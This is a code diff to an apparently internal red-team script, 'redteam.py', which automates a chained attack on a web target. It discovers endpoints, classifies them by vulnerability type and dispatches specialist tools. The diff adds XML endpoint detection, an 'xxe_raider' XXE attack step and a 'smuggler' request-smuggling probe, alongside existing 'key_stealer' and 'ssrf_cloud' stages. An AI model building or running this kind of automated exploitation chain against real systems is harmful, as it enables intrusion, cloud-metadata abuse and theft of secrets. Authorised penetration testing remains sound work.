@@ -4,8 +4,9 @@ redteam.py — Autonomous chained kill-chain (INTERNAL edition).
 
 Discovers the target's surface, CLASSIFIES each endpoint by the vuln class it's
 shaped like (login, template, deserialize sink, url-fetcher, limited action,
-GraphQL, injectable param, HTML form), then DISPATCHES the right specialist at
-each with args derived from discovery — a whole engagement from one command.
+XML parser, GraphQL, injectable param, HTML form), then DISPATCHES the right
+specialist at each with args derived from discovery — a whole engagement from
+one command. Also runs a proxy-level desync (smuggler) probe on the surface.
 
 Discovery = a path wordlist (GET + POST-probe) + HTML form/link parsing + JSON
 key extraction. Nothing is run against a target you didn't point it at.
@@ -46,6 +47,7 @@ DISCOVERY_PATHS = [
     "/api/purchase", "/api/checkout", "/api/apply", "/api/refer", "/api/invite",
     "/graphql", "/api/graphql", "/query", "/v1/graphql",
     "/api/config", "/api/admin", "/admin", "/api/orders", "/api/cart",
+    "/api/xml", "/xml", "/api/import/xml", "/soap", "/xmlrpc", "/api/feed", "/rss", "/api/upload",
 ]
 
 LOGIN_HINTS = ("/login", "/signin", "/api/login", "/auth/login", "/api/auth/login",
@@ -58,6 +60,8 @@ DESERIAL_PATH = ("load", "session", "restore", "import", "deserialize", "unseria
                  "state", "resume", "object", "cache", "cookie")
 DESERIAL_FIELDS = ("data", "payload", "state", "session", "object", "serialized", "blob", "token", "cookie")
 FETCH_PATH = ("fetch", "proxy", "image", "webhook", "preview-url", "avatar", "thumbnail", "screenshot")
+XML_PATH = ("xml", "soap", "import", "upload", "feed", "rss", "parse", "sitemap", "wsdl", "svg", "xmlrpc")
+XML_FIELDS = ("xml", "data", "body", "content", "payload", "document", "doc", "feed")
 ACTION_PATH = ("redeem", "coupon", "voucher", "promo", "gift", "vote", "like", "claim",
                "transfer", "withdraw", "purchase", "buy", "checkout", "apply", "refer",
                "invite", "follow", "upvote", "reward", "cashout")
@@ -142,6 +146,8 @@ class RedTeam(VibeTool):
             e["classes"].add("fetch")
         if any(h in s for s in segs for h in ACTION_PATH):
             e["classes"].add("action")
+        if "xml" in e.get("ctype", "") or any(h in s for s in segs for h in XML_PATH):
+            e["classes"].add("xml")
 
     def discover(self):
         self.log("=== PHASE 1: DISCOVERY ===")
@@ -178,7 +184,7 @@ class RedTeam(VibeTool):
         def has(c): return [p for p in live if c in self.ep[p]["classes"]]
         self.log(f"{len(live)} live endpoint(s) (of {len(self.ep)} probed). "
                  f"login={has('login')} template={has('template')} deserialize={has('deserialize')} "
-                 f"fetch={has('fetch')} action={has('action')} graphql={self.graphql or '-'}")
+                 f"fetch={has('fetch')} action={has('action')} xml={has('xml')} graphql={self.graphql or '-'}")
 
     # -- dispatch -----------------------------------------------------------
     def _run_tool(self, tool, args, phase, label=None):
@@ -230,6 +236,7 @@ class RedTeam(VibeTool):
         self.log("=== PHASE 2: SURFACE ===")
         self._run_tool("vibe_headers", ["--url", self.base + "/"], "surface")
         self._run_tool("key_stealer", ["--url", self.base + "/"], "surface")
+        self._run_tool("smuggler", ["--url", self.base + "/"], "surface")
 
         # Phase 3 — auth.
         self.log("=== PHASE 3: AUTH ===")
@@ -267,6 +274,9 @@ class RedTeam(VibeTool):
             prm = next((p for p in self.ep[path]["params"] if p in URL_PARAM_NAMES), "url")
             self._run_tool("ssrf_cloud", [f"--url", f"{self.base}{path}?{prm}=x", "--param", prm,
                                           "--self", self.base], "ssrf", label=f"ssrf_cloud({path})")
+        for path in take("xml"):
+            self._run_tool("xxe_raider", ["--url", self.base + path, "--self", self.base],
+                           "inject", label=f"xxe({path})")
         for path in take("action"):
             fields = self.ep[path]["fields"] - {"csrf", "token"}
             data = json.dumps({f: "rt" for f in list(fields)[:4]}) if fields else ""
@@ -303,7 +313,7 @@ def main(argv=None):
     p.add_argument("--user", default="", help="A username to use for authed phases")
     p.add_argument("--pass", dest="password", default="", help="Password for --user")
     p.add_argument("--user-field", default="username", help="Login username field name")
-    p.add_argument("-v", "--version", action="version", version="RedTeam 2.0.0")
+    p.add_argument("-v", "--version", action="version", version="RedTeam 2.1.0")
     args = p.parse_args(argv)
     return RedTeam(args.url).run(args.user, args.password, args.user_field)
 
